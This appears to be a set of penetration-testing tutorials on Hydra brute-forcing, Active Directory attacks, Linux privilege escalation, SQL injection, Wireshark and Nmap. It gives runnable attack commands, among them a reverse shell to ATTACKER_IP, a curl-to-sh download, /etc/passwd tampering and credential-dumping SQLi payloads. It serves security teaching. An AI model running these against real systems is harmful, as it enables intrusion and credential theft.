title: Credential Attacks with Hydra & Wordlists
excerpt: Practical guide to online brute-forcing with Hydra targeting SSH, FTP, HTTP forms, and RDP. Covers wordlist selection, rate limiting, and responsible testing scope.
body:
## What is Hydra?

Hydra is a fast, parallelized online password brute-forcing tool supporting 50+ protocols. It's a staple for testing authentication strength during pentests.

:::warn Scope Warning
Only use Hydra against systems you own or have **explicit written authorization** to test. Brute-force attacks can lock accounts and disrupt services.
:::

## Basic Syntax

```bash
hydra -l <user> -P <wordlist> <protocol>://<target>
hydra -L <userlist> -P <wordlist> <protocol>://<target>
```

## SSH

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# Custom port, limited threads
hydra -l root -P passwords.txt -t 4 -s 2222 ssh://192.168.1.1
```

## FTP

```bash
hydra -l admin -P rockyou.txt ftp://192.168.1.1
```

## HTTP Form (POST)

```bash
hydra -l admin -P rockyou.txt 192.168.1.1 \
  http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials"
```

Format: `path : POST body : failure string`

## HTTP Basic Auth

```bash
hydra -l admin -P rockyou.txt http-get://192.168.1.1/admin
```

## RDP

```bash
hydra -l administrator -P rockyou.txt rdp://192.168.1.1 -t 1
```

:::tip
Use `-t 1` for RDP — it has strict connection limits and will lock accounts fast if you go wide open.
:::

## Wordlists

| Wordlist | Best For |
|----------|----------|
| `rockyou.txt` | General use, most common passwords |
| `SecLists/Passwords/Common-Credentials/` | Curated targeted lists |
| `cewl http://target.com` | Custom list from the target site |
| `crunch` | Generate patterns (e.g., Admin1234) |

## Custom Wordlist with CeWL

```bash
cewl http://target.com -d 2 -m 6 -w wordlist.txt
```

## Pattern Generation with Crunch

```bash
# 8-char alphanumeric
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# Pattern: Admin + 4 digits
crunch 9 9 -t Admin%%%% -o targeted.txt
```

## Spray Before You Brute

Password spraying (one password, many users) is far less noisy than full brute-force:

```bash
hydra -L users.txt -p 'Welcome1!' ssh://target
hydra -L users.txt -p 'Winter2026!' rdp://target
```

:::info
Always try default credentials first: `admin:admin`, `admin:password`, `root:toor`. Many devices are never changed from factory defaults.
:::

title: Active Directory Attacks with BloodHound & Impacket
excerpt: Using BloodHound to map AD attack paths, identifying Kerberoastable accounts, ASREPRoasting, and Pass-the-Hash techniques using Impacket's suite of tools.
body:
## Active Directory Attacks Overview

Active Directory (AD) is the most common enterprise identity system and almost always the primary target in internal pentests. This post covers the most impactful attack paths.

## BloodHound — Mapping the Attack Path

BloodHound visualizes AD object relationships and finds the shortest path to Domain Admin.

### Collect Data with SharpHound

```powershell
# Windows — SharpHound executable
.\SharpHound.exe -c All

# PowerShell version
Invoke-BloodHound -CollectionMethod All
```

Upload the resulting `.zip` to BloodHound GUI, then use:
**Analysis → Find Shortest Paths to Domain Admins**

:::tip Pro Tip
"Find Principals with DCSync Rights" and "Find Kerberoastable Users" are the first queries I run on every engagement.
:::

## Kerberoasting

Request a TGS ticket for any service account — the ticket is encrypted with the account's NTLM hash and can be cracked offline.

```bash
# Impacket
python3 GetUserSPNs.py domain.local/user:password -request -outputfile kerberoast.hash

# Crack with hashcat
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt
```

## ASREPRoasting

Targets accounts with **"Do not require Kerberos preauthentication"** enabled.

```bash
# Get AS-REP hashes (no credentials needed)
python3 GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.hash

# Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

## Pass-the-Hash (PtH)

NTLM hashes extracted from memory let you authenticate without knowing the plaintext.

```bash
# Dump hashes from DC
python3 secretsdump.py domain.local/user:password@dc-ip

# Lateral movement with PtH
python3 psexec.py -hashes :NTLMHASH admin@target-ip
python3 wmiexec.py -hashes :NTLMHASH domain.local/admin@target-ip
```

## DCSync Attack

With `DS-Replication-Get-Changes-All` rights:

```bash
python3 secretsdump.py -just-dc-user krbtgt domain.local/user:password@dc-ip
```

This yields the **krbtgt hash** — enabling Golden Ticket attacks.

## Attack Summary

| Attack | Requires | Result |
|--------|----------|--------|
| Kerberoasting | Valid user creds | Service account hash |
| ASREPRoast | Userlist | Account without preauth |
| Pass-the-Hash | NTLM hash | Lateral movement |
| DCSync | Replication rights | Full domain dump |

:::warn
AD attacks leave traces in Event Logs (IDs 4768, 4769, 4776). Blue teams monitor these actively. Stay quiet.
:::

title: Linux Privilege Escalation: Common Techniques
excerpt: A structured walkthrough of sudo misconfigurations, SUID binaries, cron job hijacking, and kernel exploits — with real examples from HackTheBox and TryHackMe machines.
body:
## The Goal

After getting a foothold, the aim is to escalate from a low-privileged shell to **root**. Here are the most reliable paths.

## Initial Enumeration

Always start here. Use LinPEAS for automated checks:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Manual checks:

```bash
# Who am I?
id && whoami

# Kernel version
uname -a

# OS info
cat /etc/os-release

# Find writable files
find / -writable 2>/dev/null | grep -v proc

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Running services
ps aux | grep root
```

## Sudo Misconfigurations

```bash
sudo -l
```

If you see `(ALL) NOPASSWD: /usr/bin/vim`, check [GTFOBins](https://gtfobins.github.io):

```bash
sudo vim -c '!bash'
sudo find . -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.system("/bin/bash")'
```

:::tip
Every binary on GTFOBins has specific exploit paths for sudo, SUID, and cron. Always check it first.
:::

## SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

Commonly exploitable: `bash`, `find`, `nmap`, `python`, `less`, `vim`

```bash
# SUID find
find . -exec /bin/sh -p \; -quit

# SUID bash
/bin/bash -p
```

## Cron Job Hijacking

```bash
cat /etc/crontab
ls -la /etc/cron*
```

If a cron runs a **script you can write to**:

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/script.sh
nc -lvnp 4444
```

## Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt hack h4cked

# Add a new root-level user
echo 'owneduser:$1$hack$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

su owneduser
```

:::danger
In real engagements, modifying `/etc/passwd` is noisy and leaves evidence. Document and revert after testing.
:::

## Kernel Exploits (Last Resort)

```bash
uname -r
searchsploit linux kernel 4.4.0
```

Notable examples: **DirtyCow** (CVE-2016-5195), **PwnKit** (CVE-2021-4034). Always verify the version before running — some exploits will crash or corrupt the machine.

title: Wireshark for Blue Teamers: Packet Analysis
excerpt: How to use Wireshark display filters, stream analysis, and threat hunting to detect suspicious traffic like C2 beaconing, data exfiltration, and credential sniffing.
body:
## Why Wireshark for Blue Teamers?

Wireshark is the most widely-used packet analyzer. It lets you capture and inspect network traffic in real-time — essential for incident response, threat hunting, and forensics.

## Essential Display Filters

```wireshark
# HTTP traffic only
http

# Filter by IP address
ip.addr == 192.168.1.100
ip.src == 10.0.0.1
ip.dst == 8.8.8.8

# Filter by port
tcp.port == 443
udp.port == 53

# DNS queries
dns

# TCP SYN only (new connections)
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Large packets — possible exfiltration
frame.len > 1400

# POST requests containing credentials
http.request.method == POST
ftp.request.command == PASS
```

## Capturing Traffic

```bash
# Launch Wireshark on eth0
wireshark -i eth0

# Capture to a file via tcpdump
tcpdump -i any -w capture.pcap
tcpdump -i eth0 port 443 -w https_traffic.pcap
```

## Detecting C2 Beaconing

C2 (command-and-control) beaconing is characterized by **periodic, regular outbound connections** to an external IP.

**Signs to look for:**
- Regular-interval connections (every 30s / 60s)
- Unusual high-numbered ports
- Long-duration sessions with tiny data volume
- Connections to IPs with no PTR (reverse DNS) record

```wireshark
# Focus on a suspicious IP
ip.dst == <suspicious_ip>

# Unusual outbound ports
tcp.dstport > 10000 && !(ip.dst == 192.168.0.0/16)
```

:::tip Pro Tip
Use **Statistics → Conversations** to instantly spot hosts with unusual traffic volumes or connection counts.
:::

## Following TCP Streams

Right-click any packet → **Follow → TCP Stream** to reconstruct the full conversation in cleartext. Essential for HTTP, FTP, Telnet analysis.

## Exporting Files from Captures

- **File → Export Objects → HTTP** — extract files sent over HTTP
- **File → Export Objects → SMB** — extract files from captured SMB shares

:::info
Save suspicious captures with `Ctrl+Shift+S` and share them with your team for further analysis.
:::

title: SQL Injection: From Theory to Exploitation
excerpt: Deep dive into union-based, blind, and time-based SQL injection techniques. Includes real-world payloads, SQLMap usage, and prevention best practices aligned with OWASP Top 10.
body:
## What is SQL Injection?

SQL Injection (SQLi) occurs when user input is unsafely embedded in SQL queries, letting attackers manipulate database logic. It ranks consistently in the **OWASP Top 10** and remains one of the most critical web vulnerabilities.

## Types of SQLi

| Type | When to Use | Payload Example |
|------|-------------|----------------|
| Union-based | Error/output visible | `' UNION SELECT null,user()-- -` |
| Error-based | DB errors shown | `' AND extractvalue(1,concat(0x7e,user()))-- -` |
| Boolean blind | True/false responses | `' AND 1=1-- -` |
| Time-based blind | No output at all | `' AND SLEEP(5)-- -` |

## Manual Testing Steps

### Step 1 — Detect the injection point

```sql
'
''
`
' OR '1'='1
-- -
```

### Step 2 — Find number of columns

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -   -- increment until error
```

### Step 3 — Find visible columns

```sql
' UNION SELECT null,null,null-- -
' UNION SELECT 1,2,3-- -
```

### Step 4 — Extract data

```sql
' UNION SELECT user(),database(),version()-- -

-- List all tables
' UNION SELECT table_name,null FROM information_schema.tables WHERE table_schema=database()-- -

-- List columns for 'users'
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'-- -

-- Dump credentials
' UNION SELECT username,password FROM users-- -
```

:::tip Pro Tip
Try different comment styles: `-- -`, `#`, `/**/`. WAFs often block spaces — use `/**/` to bypass.
:::

## SQLMap Automation

```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# List databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump a database
sqlmap -u "http://target.com/page?id=1" -D dbname --dump

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# With session cookie
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Max aggression
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
```

## Prevention

```python
# INSECURE — never do this
query = "SELECT * FROM users WHERE name = '" + user_input + "'"

# SECURE — parameterized query
cursor.execute("SELECT * FROM users WHERE name = ?", (user_input,))
```

:::danger Critical
Never concatenate user input into SQL queries. Use parameterized queries or prepared statements — always.
:::

title: Nmap Cheatsheet — Recon Like a Pro
excerpt: A practical reference of the most useful Nmap scans, scripts, and timing options for penetration testing engagements. From initial ping sweeps to OS fingerprinting and NSE automation.
body:
## What is Nmap?

Nmap (Network Mapper) is the go-to tool for network discovery and security auditing. Mastering it is a core skill for any penetration tester.

## Host Discovery

```bash
# Ping sweep — identify live hosts
nmap -sn 192.168.1.0/24

# Skip host discovery — treat all as online
nmap -Pn 10.10.10.1

# ARP scan (faster on LAN)
nmap -PR 192.168.1.0/24
```

## Port Scan Types

| Flag | Scan Type | Notes |
|------|-----------|-------|
| `-sS` | SYN Stealth | Default, requires root |
| `-sT` | TCP Connect | No root needed |
| `-sU` | UDP Scan | Slow but critical |
| `-sN` | Null Scan | Firewall evasion |
| `-sF` | FIN Scan | Evasion technique |
| `-sX` | Xmas Scan | All flags set |

## Service & Version Detection

```bash
# Version detection
nmap -sV 10.10.10.1

# Aggressive scan — OS + version + scripts + traceroute
nmap -A 10.10.10.1

# OS fingerprinting only
nmap -O 10.10.10.1
```

## NSE Scripts

NSE (Nmap Scripting Engine) massively extends Nmap's capabilities.

```bash
# Default scripts
nmap -sC 10.10.10.1

# Single script
nmap --script=http-title 10.10.10.1

# All vulnerability scripts
nmap --script=vuln 10.10.10.1

# SMB enumeration
nmap --script=smb-enum-shares,smb-enum-users -p 445 10.10.10.1
```

:::tip Pro Tip
Combine `-sV -sC` for the most useful initial scan. Add `-oA output` to save all formats at once.
:::

## Timing Templates

```bash
nmap -T0  # Paranoid — IDS evasion
nmap -T1  # Sneaky
nmap -T3  # Normal (default)
nmap -T4  # Aggressive — recommended for CTFs
nmap -T5  # Insane — may miss ports on slow targets
```

## Output Formats

```bash
nmap -oN output.txt     # Normal text
nmap -oX output.xml     # XML (Metasploit, etc.)
nmap -oG output.gnmap   # Grepable
nmap -oA output         # All three at once
```

## My Go-To First Scan

```bash
nmap -sV -sC -T4 -oA initial <target>
```

Follow up with a full port scan:

```bash
nmap -p- -T4 --min-rate 5000 -oA fullports <target>
```

:::warn Warning
Always obtain written authorization before scanning any target. Unauthorized scanning is illegal in most jurisdictions.
:::
